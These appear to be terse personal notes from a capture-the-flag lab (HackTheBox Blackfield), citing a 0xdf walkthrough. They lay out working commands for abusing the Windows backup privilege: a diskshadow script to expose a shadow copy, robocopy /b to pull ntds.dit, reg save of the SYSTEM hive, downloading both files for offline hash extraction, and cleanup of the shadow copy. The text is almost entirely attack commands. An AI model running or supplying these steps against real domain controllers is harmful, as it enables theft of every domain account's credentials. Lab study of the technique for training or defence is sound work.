
https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#priv-svc_backup--administrator
https://github.com/giuliano108/SeBackupPrivilege


we will use diskshadow to clone the harddrive including open files - like ntds.dit


script
```powershell
@'
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
'@>script.txt
```

0xdf is:
```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```
0xdf clean up:
```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
delete shadows volume df
reset
```

(to make a file of this in ps just surround with @'   '@)

run using
`diskshadow /s scriptname`

`robocopy /b E:\Windows\ntds . ntds.dit`

we also need system
`reg save hklm\system c:\temp\system.bak`

download the files
`download ntds.dit`
`download system`


